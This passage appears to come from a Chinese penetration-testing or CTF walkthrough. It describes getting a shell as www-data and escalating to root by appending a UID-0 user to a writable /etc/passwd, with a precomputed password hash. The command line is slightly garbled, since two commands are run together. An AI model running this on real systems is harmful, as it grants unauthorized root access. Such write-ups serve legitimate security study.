这时候去访问，可以直接用这个传一个自己的 shell

  

![](../Images/98c231f0c9a3098eda0fd9c0255f8872.png "image.png")

  

kali 上面监听，然后浏览器访问，拿到 shell，可以发现 www-data 对于 /etc/passwd 是有写权限的，所以可以直接把添加一个用户进去，然后 su 一下

  

```

openssl passwd -1 -salt hack yichenecho 'hack:$1$hack$gP1TCDm4c1ABbBzR6fMid1:0:0::/root:/bin/sh'
 >> /etc/passwd
```

  

这样用户名为：hack，密码为：yichen，切换一下就是 root 权限
